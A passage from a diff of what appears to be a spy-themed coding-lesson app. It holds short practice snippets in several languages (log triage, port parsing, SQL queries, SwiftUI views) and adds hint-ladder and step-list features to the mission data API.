dataclass\n\n@dataclass\nclass Node:\n    name: str\n    strength: int = 0\n\n    def boost(self, n):\n        self.strength += n\n        return self.strength\n\n    def __str__(self):\n        return f\"{self.name}({self.strength})\"\n","py7":"class AccessDenied(Exception):\n    pass\n\ndef unlock(code):\n    if code == \"0451\":\n        return \"OPEN\"\n    raise AccessDenied(f\"bad code {code!r}\")\n\ndef safe_unlock(code):\n    try:\n        return unlock(code)\n    except AccessDenied:\n        return \"DENIED\"\n","py8":"from collections import Counter\nimport json\n\ndef top_words(text, n):\n    return Counter(text.lower().split()).most_common(n)\n\ndef to_json(text, n):\n    return json.dumps(dict(top_words(text, n)))\n","py9":"import functools\n\ndef chunks(seq, size):\n    for i in range(0, len(seq), size):\n        yield list(seq[i:i + size])\n\ndef shout(fn):\n    @functools.wraps(fn)\n    def wrapper(*args, **kwargs):\n        return fn(*args, **kwargs).upper()\n    return wrapper\n","rs1":"fn intro(handle: &str, level: u32) -> String {\n    format!(\"Agent {} // level {}\", handle, level)\n}\n\nfn main() {\n    let mut counter = 0;\n    counter += 1;\n    println!(\"{} (run {})\", intro(\"neo\", 3), counter);\n}\n","rs10":"use std::sync::{Arc, Mutex};\nuse std::thread;\n\nfn sweep(hosts: Vec<String>) -> usize {\n    let counter = Arc::new(Mutex::new(0usize));\n    let mut handles = vec![];\n    for host in hosts {\n        let c = Arc::clone(&counter);\n        handles.push(thread::spawn(move || {\n            if !host.is_empty() {\n                *c.lock().unwrap() += 1;\n            }\n        }));\n    }\n    for h in handles {\n        h.join().unwrap();\n    }\n    let total = *counter.lock().unwrap();\n    total\n}\n","rs11":"fn longest<'a>(a: &'a str, b: &'a str) -> &'a str {\n    if a.len() >= b.len() { a } else { b }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn picks_longer() {\n        assert_eq!(longest(\"abc\", \"a\"), \"abc\");\n    }\n\n    #[test]\n    fn ties_go_to_first() {\n        assert_eq!(longest(\"ab\", \"cd\"), \"ab\");\n    }\n}\n","rs12":"use std::fmt;\n\n#[derive(Debug, PartialEq)]\nenum Status {\n    Ok,\n    Fail,\n}\n\n#[derive(Debug)]\nstruct Record {\n    ip: String,\n    status: Status,\n}\n\nfn parse(line: &str) -> Result<Record, String> {\n    let mut parts = line.split_whitespace();\n    let ip = parts.next().ok_or(\"missing ip\")?;\n    let status = match parts.next() {\n        Some(\"OK\") => Status::Ok,\n        Some(\"FAIL\") => Status::Fail,\n        other => return Err(format!(\"bad status: {:?}\", other)),\n    };\n    if parts.next().is_some() {\n        return Err(\"too many fields\".into());\n    }\n    Ok(Record { ip: ip.to_string(), status })\n}\n\nstruct Summary {\n    total: usize,\n    fails: usize,\n}\n\nimpl fmt::Display for Summary {\n    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {\n        write!(f, \"{} total / {} fails\", self.total, self.fails)\n    }\n}\n\nfn analyze(lines: &[&str]) -> Summary {\n    let records: Vec<Record> = lines.iter().filter_map(|l| parse(l).ok()).collect();\n    let fails = records.iter().filter(|r| r.status == Status::Fail).count();\n    Summary { total: records.len(), fails }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn counts_fails() {\n        let s = analyze(&[\"1.1.1.1 FAIL\", \"2.2.2.2 OK\", \"junk\"]);\n        assert_eq!((s.total, s.fails), (2, 1));\n    }\n\n    #[test]\n    fn rejects_bad_lines() {\n        assert!(parse(\"x\").is_err());\n    }\n}\n","rs2":"fn threat_level(score: u32) -> &'static str {\n    match score {\n        90..=u32::MAX => \"CRITICAL\",\n        60..=89 => \"HIGH\",\n        30..=59 => \"MEDIUM\",\n        _ => \"LOW\",\n    }\n}\n","rs3":"use std::collections::HashMap;\n\nfn tally(ips: &[String]) -> HashMap<String, u32> {\n    let mut counts = HashMap::new();\n    for ip in ips {\n        *counts.entry(ip.clone()).or_insert(0) += 1;\n    }\n    counts\n}\n","rs4":"fn count_words(text: &str) -> usize {\n    text.split_whitespace().count()\n}\n\nfn redact(msg: &mut String) {\n    *msg = String::from(\"[REDACTED]\");\n}\n","rs5":"fn caesar(text: &str, shift: u8) -> String {\n    text.chars()\n        .map(|c| {\n            if c.is_ascii_alphabetic() {\n                let base = if c.is_ascii_uppercase() { b'A' } else { b'a' };\n                (((c as u8 - base + shift % 26) % 26) + base) as char\n            } else {\n                c\n            }\n        })\n        .collect()\n}\n","rs6":"#[derive(Debug)]\nstruct Node {\n    name: String,\n    strength: u32,\n}\n\nimpl Node {\n    fn new(name: &str) -> Self {\n        Self { name: name.to_string(), strength: 0 }\n    }\n    fn boost(&mut self, by: u32) -> u32 {\n        self.strength += by;\n        self.strength\n    }\n}\n\nenum Event {\n    Login(String),\n    Breach(u8),\n    Logout,\n}\n\nfn describe(e: &Event) -> String {\n    match e {\n        Event::Login(user) => format!(\"login {user}\"),\n        Event::Breach(sev) => format!(\"breach {sev}\"),\n        Event::Logout => \"logout\".to_string(),\n    }\n}\n","rs7":"#[derive(Debug)]\nenum ParseError {\n    Empty,\n    BadPort(String),\n}\n\nfn parse_port(s: &str) -> Result<u16, ParseError> {\n    if s.is_empty() {\n        return Err(ParseError::Empty);\n    }\n    s.parse::<u16>().map_err(|_| ParseError::BadPort(s.to_string()))\n}\n\nfn ports(list: &[&str]) -> Result<Vec<u16>, ParseError> {\n    let mut out = Vec::new();\n    for s in list {\n        out.push(parse_port(s)?);\n    }\n    Ok(out)\n}\n","rs8":"trait Detector {\n    fn detect(&self, line: &str) -> bool;\n}\n\nstruct Keyword(String);\n\nimpl Detector for Keyword {\n    fn detect(&self, line: &str) -> bool {\n        line.contains(&self.0)\n    }\n}\n\nfn count_hits<D: Detector>(d: &D, lines: &[&str]) -> usize {\n    lines.iter().filter(|l| d.detect(l)).count()\n}\n","rs9":"fn fail_ips(lines: &[&str]) -> Vec<String> {\n    lines\n        .iter()\n        .filter(|l| l.ends_with(\"FAIL\"))\n        .map(|l| l.split_whitespace().next().unwrap_or(\"\").to_string())\n        .collect()\n}\n","sh1":"mkdir -p ops/intel/2026\ncd ops/intel/2026\ntouch brief.txt\nls -la\n","sh10":"curl -fsS -H \"Authorization: Bearer $TOKEN\" https://relay.example/api/nodes | jq -r '.nodes[] | select(.online == false) | .name'\n","sh11":"export RELAY_ENV=prod\nexport PATH=\"$HOME/ops/bin:$PATH\"\n*/15 * * * * /opt/ops/sweep.sh >> /var/log/sweep.log 2>&1\n","sh12":"#!/usr/bin/env bash\nset -euo pipefail\n[[ -r \"${1:-}\" ]] || { echo \"usage: triage.sh <log>\" >&2; exit 1; }\ntop_ips() {\n  awk '{ print $1 }' \"$1\" | sort | uniq -c | sort -nr | head -n 3\n}\ntop_ips \"$1\" | while read -r count ip; do\n  if (( count > 20 )) || [[ $count -gt 20 ]]; then\n    echo \"block $ip ($count hits)\"\n  fi\ndone\nexit 0\n","sh2":"grep -i BLACKOUT relay.log | grep -v TEST | wc -l\n","sh3":"TARGET=\"relay.log\"\nSTAMP=$(date +%F)\nHITS=$(grep -c FAIL \"$TARGET\")\necho \"$STAMP: $HITS failures in $TARGET\"\n","sh4":"#!/usr/bin/env bash\nif [[ -z \"$1\" ]]; then\n  echo \"usage: $0 <file>\"\n  exit 1\nelif [[ -f \"$1\" ]]; then\n  echo \"scanning $1\"\nelse\n  echo \"not found: $1\"\n  exit 2\nfi\n","sh5":"while IFS= read -r host; do\n  ping -c 1 \"$host\" &>/dev/null && echo \"$host up\" || echo \"$host down\"\ndone < hosts.txt\n","sh6":"archive() {\n  local src=\"$1\"\n  local dest=\"${2:-/tmp}\"\n  [[ -e \"$src\" ]] || return 1\n  tar -czf \"$dest/$(basename \"$src\").tar.gz\" \"$src\"\n}\narchive \"$@\"\n","sh7":"awk '{ print $1 }' access.log | sort | uniq -c | sort -nr | head -n 5\nsed 's/token=[^ ]*/token=REDACTED/g' app.log > clean.log\n","sh8":"chmod 700 sweep.sh\nchmod 600 ~/.ssh/id_ed25519\nPID=$(pgrep cryptominer)\nkill -TERM \"$PID\"\n","sh9":"#!/usr/bin/env bash\nset -euo pipefail\nWORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\ncurl -fsS https://relay.example/health > \"$WORK/health.json\" || { echo \"relay down\" >&2; exit 3; }\n","sql1":"SELECT name AS handle, faction FROM agents;\n","sql10":"CREATE INDEX idx_events_ip_status ON events(ip, status); CREATE UNIQUE INDEX idx_agents_name ON agents(name);\n","sql11":"SELECT name, faction, r FROM (SELECT name, faction, RANK() OVER (PARTITION BY faction ORDER BY rank DESC) AS r FROM agents) WHERE r = 1 ORDER BY faction;\n","sql12":"CREATE VIEW threat_board AS SELECT e.ip, COUNT(*) AS fails, COUNT(DISTINCT a.name) AS agents, MAX(e.ts) AS last_seen FROM events e JOIN agents a ON a.id=e.agent_id WHERE e.status='failed' GROUP BY e.ip; SELECT * FROM threat_board ORDER BY fails DESC, ip;\n","sql2":"SELECT name, rank FROM agents WHERE faction IN ('sentinel','logos') AND rank >= 3 ORDER BY name;\n","sql3":"SELECT DISTINCT ip FROM events WHERE status = 'failed' ORDER BY ip LIMIT 3;\n","sql4":"SELECT ip, COUNT(*) AS fails FROM events WHERE status='failed' GROUP BY ip HAVING COUNT(*) >= 2 ORDER BY fails DESC, ip;\n","sql5":"SELECT a.name, e.ip, e.ts FROM events e JOIN agents a ON a.id = e.agent_id WHERE e.status='failed' ORDER BY e.id;\n","sql6":"SELECT a.name FROM agents a LEFT JOIN events e ON e.agent_id = a.id WHERE e.id IS NULL ORDER BY a.name;\n","sql7":"WITH f AS (SELECT agent_id, COUNT(*) c FROM events WHERE status='failed' GROUP BY agent_id) SELECT a.name, f.c FROM f JOIN agents a ON a.id=f.agent_id WHERE f.c=(SELECT MAX(c) FROM f) ORDER BY a.name;\n","sql8":"CREATE TABLE safehouses (id INTEGER PRIMARY KEY, district TEXT NOT NULL, capacity INTEGER NOT NULL CHECK (capacity > 0), node_id INTEGER REFERENCES nodes(id));\n","sql9":"BEGIN; UPDATE nodes SET online=0 WHERE district='old quarter'; INSERT INTO nodes (district, online) VALUES ('tunnel',1); DELETE FROM nodes WHERE district='harbor' AND online=0; COMMIT;\n","sw1":"func intro(handle: String, level: Int) -> String {\n    \"Agent \\(handle) // level \\(level)\"\n}\n\nlet agent = \"neo\"\nvar runs = 0\nruns += 1\nprint(intro(handle: agent, level: 3), runs)\n","sw10":"func ping(_ host: String) async -> Bool {\n    try? await Task.sleep(for: .milliseconds(10))\n    return !host.isEmpty\n}\n\nactor Ledger {\n    private var hits = 0\n    func record() { hits += 1 }\n    func total() -> Int { hits }\n}\n\nfunc sweep(_ hosts: [String]) async -> Int {\n    await withTaskGroup(of: Bool.self) { group in\n        for h in hosts { group.addTask { await ping(h) } }\n        var up = 0\n        for await ok in group where ok { up += 1 }\n        return up\n    }\n}\n","sw11":"import Testing\n\nenum ScanError: Error { case bad }\n\nprivate func parsePort(_ s: String) throws -> Int {\n    guard let p = Int(s), (1...65535).contains(p) else { throw ScanError.bad }\n    return p\n}\n\n@Test func parsesValidPort() throws {\n    #expect(try parsePort(\"443\") == 443)\n}\n\n@Test(\"rejects garbage\", arguments: [\"\", \"abc\", \"70000\"])\nfunc rejects(_ input: String) {\n    #expect(throws: ScanError.self) { try parsePort(input) }\n}\n","sw12":"import SwiftUI\n\n@Observable final class Monitor {\n    var alerts: [String] = []\n    func refresh() async {\n        try? await Task.sleep(for: .milliseconds(200))\n        alerts.append(\"ping \\(Date.now.formatted(date: .omitted, time: .standard))\")\n    }\n}\n\nstruct ConsoleView: View {\n    @State private var monitor = Monitor()\n    @State private var filter = \"\"\n\n    var body: some View {\n        NavigationStack {\n            List(monitor.alerts.filter { filter.isEmpty || $0.contains(filter) }, id: \\.self) { alert in\n                Text(alert).font(.system(.body, design: .monospaced))\n            }\n            .searchable(text: $filter)\n            .toolbar {\n                Button(\"Refresh\") {\n                    Task { await monitor.refresh() }\n                }\n            }\n            .navigationTitle(\"Console\")\n        }\n    }\n}\n","sw2":"func threatLevel(_ score: Int) -> String {\n    switch score {\n    case 90...: return \"CRITICAL\"\n    case 60..<90: return \"HIGH\"\n    case 30..<60: return \"MEDIUM\"\n    default: return \"LOW\"\n    }\n}\n\nfunc validPin(_ pin: String) -> Bool {\n    guard pin.count == 6, pin.allSatisfy(\\.isNumber) else { return false }\n    return true\n}\n","sw3":"func lookup(_ name: String, in db: [String: String]) -> String {\n    guard let ip = db[name] else { return db[\"default\"] ?? \"unknown\" }\n    return ip\n}\n","sw4":"func tally(_ ips: [String]) -> [String: Int] {\n    var counts: [String: Int] = [:]\n    for ip in ips { counts[ip, default: 0] += 1 }\n    return counts\n}\n\nfunc loud(_ ports: [Int]) -> [Int] {\n    ports.filter { $0 > 1024 }.map { $0 * 10 }\n}\n","sw5":"var handlers: [() -> Void] = []\n\nfunc scan(host: String, port: Int = 443) -> String {\n    \"\\(host):\\(port)\"\n}\n\nfunc retry(times: Int, _ op: () -> Bool) -> Bool {\n    for _ in 0..<times where op() { return true }\n    return false\n}\n\nlet ok = retry(times: 3) { Bool.random() }\n\nfunc onAlert(_ h: @escaping () -> Void) {\n    handlers.append(h)\n}\n","sw6":"struct Node {\n    var name: String\n    var strength = 0\n    var isHot: Bool { strength > 80 }\n    mutating func boost(_ by: Int) { strength += by }\n}\n\nfinal class Session {\n    let id: String\n    init(id: String) { self.id = id }\n}\n","sw7":"enum ScanError: Error {\n    case empty\n    case badPort(String)\n}\n\nfunc parsePort(_ s: String) throws -> Int {\n    guard !s.isEmpty else { throw ScanError.empty }\n    guard let p = Int(s), (1...65535).contains(p) else { throw ScanError.badPort(s) }\n    return p\n}\n\ndo {\n    let p = try parsePort(\"443\")\n    print(p)\n} catch {\n    print(\"failed: \\(error)\")\n}\n","sw8":"enum Event {\n    case login(user: String)\n    case breach(severity: Int)\n    case logout\n}\n\nfunc describe(_ e: Event) -> String {\n    switch e {\n    case .login(let user): return \"login \\(user)\"\n    case .breach(let s) where s >= 8: return \"CRITICAL breach\"\n    case .breach(let s): return \"breach \\(s)\"\n    case .logout: return \"logout\"\n    }\n}\n\nenum Faction: String, CaseIterable { case logos, sentinel, meridian }\n","sw9":"protocol Detector {\n    func detect(_ line: String) -> Bool\n}\n\nextension Detector {\n    func count(in lines: [String]) -> Int { lines.filter(detect).count }\n}\n\nstruct Keyword: Detector {\n    let word: String\n    func detect(_ line: String) -> Bool { line.contains(word) }\n}\n\nfunc strongest<T: Comparable>(_ xs: [T]) -> T? { xs.max() }\n","ts1":"function intro(handle: string, level: number): string {\n  return `Agent ${handle} // level ${level}`;\n}\n","ts10":"async function sweep(hosts: string[], ping: (h: string) => Promise<number>): Promise<Record<string, number>> {\n  const times = await Promise.all(hosts.map(h => ping(h)));\n  const out: Record<string, number> = {};\n  hosts.forEach((h, i) => { out[h] = times[i]; });\n  return out;\n}\n","ts11":"type Result<T> = { ok: true; value: T } | { ok: false; error: string };\n\nfunction parsePort(s: string): Result<number> {\n  if (!/^\\d+$/.test(s)) return { ok: false, error: \"invalid port\" };\n  const n = Number(s);\n  return n >= 1 && n <= 65535 ? { ok: true, value: n } : { ok: false, error: \"invalid port\" };\n}\nfunction isOk<T>(r: Result<T>): r is { ok: true; value: T } {\n  return r.ok;\n}\n","ts12":"type Result<T> = { ok: true; value: T } | { ok: false; error: string };\n\ntype Ev = { kind: \"fail\"; ip: string } | { kind: \"ok\"; ip: string };\ninterface Summary { total: number; fails: number; topIp: string | null; errors: number }\n\nfunction parse(line: string): Result<Ev> {\n  const [ip, status, ...extra] = line.trim().split(/\\s+/);\n  if (!ip || extra.length || (status !== \"OK\" && status !== \"FAIL\")) return { ok: false, error: `bad line: ${line}` };\n  return { ok: true, value: { kind: status === \"FAIL\" ? \"fail\" : \"ok\", ip } };\n}\n\nasync function analyze(src: () => Promise<string[]>): Promise<Summary> {\n  const lines = await src();\n  const counts = new Map<string, number>();\n  let total = 0, fails = 0, errors = 0;\n  for (const line of lines) {\n    const r = parse(line);\n    if (!r.ok) { errors++; continue; }\n    total++;\n    if (r.value.kind === \"fail\") { fails++; counts.set(r.value.ip, (counts.get(r.value.ip) ?? 0) + 1); }\n  }\n  let topIp: string | null = null, best = 0;\n  for (const [ip, n] of counts) if (n > best) { best = n; topIp = ip; }\n  return { total, fails, topIp, errors };\n}\n","ts2":"type Level = \"LOW\" | \"MEDIUM\" | \"HIGH\" | \"CRITICAL\";\nfunction threatLevel(score: number): Level {\n  if (score >= 90) return \"CRITICAL\";\n  if (score >= 60) return \"HIGH\";\n  if (score >= 30) return \"MEDIUM\";\n  return \"LOW\";\n}\n","ts3":"function tally(items: string[]): Record<string, number> {\n  const out: Record<string, number> = {};\n  for (const x of items) out[x] = (out[x] ?? 0) + 1;\n  return out;\n}\nfunction top(items: string[]): [string, number] | undefined {\n  let best: [string, number] | undefined;\n  for (const [k, v] of Object.entries(tally(items))) if (!best || v > best[1]) best = [k, v];\n  return best;\n}\n","ts4":"interface Report {\n  readonly id: number;\n  source: string;\n  verified?: boolean;\n}\nfunction summarize(r: Report): string {\n  return `#${r.id} from ${r.source} [${r.verified === true ? \"verified\" : \"unverified\"}]`;\n}\n","ts5":"type Predicate<T> = (x: T) => boolean;\nfunction where<T>(items: T[], p: Predicate<T>): T[] {\n  return items.filter(p);\n}\nfunction not<T>(p: Predicate<T>): Predicate<T> {\n  return x => !p(x);\n}\n","ts6":"class Vault {\n  private secrets = new Map<string, string>();\n  constructor(private readonly owner: string) {}\n  store(k: string, v: string): void { this.secrets.set(k, v); }\n  read(k: string): string | undefined { return this.secrets.get(k); }\n  get size(): number { return this.secrets.size; }\n  describe(): string { return `${this.owner}: ${this.size} secrets`; }\n}\n","ts7":"function pluck<T, K extends keyof T>(items: T[], key: K): T[K][] {\n  return items.map(i => i[key]);\n}\nfunction indexBy<T, K extends keyof T>(items: T[], key: K): Map<T[K], T> {\n  return new Map(items.map(i => [i[key], i] as [T[K], T]));\n}\n","ts8":"type Event =\n  | { kind: \"login\"; user: string }\n  | { kind: \"breach\"; severity: number }\n  | { kind: \"logout\"; user: string };\n\nfunction describe(e: Event): string {\n  switch (e.kind) {\n    case \"login\": return `${e.user} in`;\n    case \"breach\": return `BREACH sev ${e.severity}`;\n    case \"logout\": return `${e.user} out`;\n    default: {\n      const unreachable: never = e;\n      return unreachable;\n    }\n  }\n}\n","ts9":"function patch<T>(obj: T, changes: Partial<T>): T {\n  return { ...obj, ...changes };\n}\nfunction redact<T, K extends keyof T>(obj: T, key: K): Omit<T, K> {\n  const { [key]: _removed, ...rest } = obj;\n  return rest as Omit<T, K>;\n}\n"}); })(typeof window !== "undefined" ? window : globalThis);
 
 """##,
     // tools/swift-bridge.js
@@ -2960,13 +4493,13 @@ TEST(Buffer, ThrowsOutOfRange) { Buffer b(4); EXPECT_THROW(b.at(4), std::out_of_
     });
     return out;
   };
-  var meta = function (m) { return RA.harnessMeta(m.lang in { python: 1, javascript: 1, typescript: 1, sql: 1 } ? "" : RA.HARNESS[m.id] || ""); };
+  var meta = function (m) { return RA.harnessMeta(m.lang in { basics: 1, python: 1, javascript: 1, typescript: 1, sql: 1 } ? "" : RA.HARNESS[m.id] || ""); };
   var src = function (k) { var s = RA.SOURCES[k]; return s ? { label: s.label, url: s.url } : { label: k, url: "" }; };
   g.RAX = {
     data: function () {
       var langs = Object.keys(RA.langs).map(function (k) {
         var l = RA.langs[k];
-        return { id: k, name: l.name, tag: l.tag, why: l.why, engine: RA.ENGINES[k].label, ci: RA.CI_TOOLCHAINS[k] || "" };
+        return { id: k, name: l.name, tag: l.tag, why: l.why, engine: RA.ENGINES[k].label, ci: RA.CI_TOOLCHAINS[k] || "", track: !!l.track };
       });
       var dossiers = {};
       Object.keys(RA.DOSSIERS).forEach(function (k) {
@@ -2986,20 +4519,32 @@ TEST(Buffer, ThrowsOutOfRange) { Buffer b(4); EXPECT_THROW(b.at(4), std::out_of_
           var mt = meta(m);
           return { id: m.id, lang: m.lang, rank: m.rank, module: m.module, xp: m.xp, title: m.title, concept: m.concept,
             lesson: segs(m.lesson), task: strip(m.task), starter: m.starter, ciOnly: mt.ciOnly || null,
-            checkpoints: mt.checkpoints || [], solution: (RA.SOLUTIONS && RA.SOLUTIONS[m.id]) || "" };
+            checkpoints: mt.checkpoints || [], solution: (RA.SOLUTIONS && RA.SOLUTIONS[m.id]) || "",
+            steps: RA.stepsFor(m).map(strip), keyTerms: RA.keyTerms(m, 6) };
         }),
         langs: langs, factions: factions, dossiers: dossiers, modules: RA.MODULES,
         intel: RA.INTEL.slice().sort(function (a, b) { return a.year - b.year; }),
         petStages: RA.PET_STAGES, petParts: parts,
         praxis: { stages: RA.PRAXIS.stages, selfExplain: RA.PRAXIS.selfExplain, fadeAfter: RA.PRAXIS.fadeAfter,
           evidence: RA.PRAXIS.evidence.map(function (e) { return { claim: e.claim, source: src(e.src) }; }) },
-        judge0: RA.judge0Hosts
+        judge0: RA.judge0Hosts,
+        orient: (function () { var o = {}; Object.keys(RA.ORIENT).forEach(function (k) { var x = RA.ORIENT[k];
+          o[k] = { run: strip(x.run), file: strip(x.file), out: strip(x.out), comment: strip(x.comment), gotchas: x.gotchas.map(strip) }; }); return o; })()
       });
     },
     brief: function (id, faction) { return RA.brief(BY[id], faction); },
     structure: function (id, code) {
       return JSON.stringify(BY[id].checks.map(function (c) { c.re.lastIndex = 0; return { ok: c.re.test(code), hint: c.hint }; }));
     },
+    // Hint ladder, linked to this mission's own steps, checks, checkpoints and reference solution.
+    hint: function (id, code, reportJSON, tier) {
+      var m = BY[id], rep = reportJSON ? JSON.parse(reportJSON) : null;
+      var h = RA.hint(m, code, rep, Number(tier), (RA.SOLUTIONS && RA.SOLUTIONS[id]) || "");
+      return JSON.stringify({ tier: h.tier, title: h.title, kind: h.kind, text: strip(h.html), step: h.step == null ? null : h.step,
+        lines: h.lines || null, answer: h.answer || null, pieces: !!h.pieces, code: h.code || null });
+    },
+    explain: function (id, resultJSON) { return strip(RA.explain(BY[id], JSON.parse(resultJSON))); },
+    joinPieces: function (partsJSON) { return RA.joinPieces(JSON.parse(partsJSON)); },
     request: function (id, code, cfg) { return JSON.stringify(RA.judge0Request(BY[id], code, JSON.parse(cfg || "{}"))); },
     finish: function (id, req, resp, code) {
       var rep = RA.judge0Finish(BY[id], JSON.parse(req), JSON.parse(resp), code);
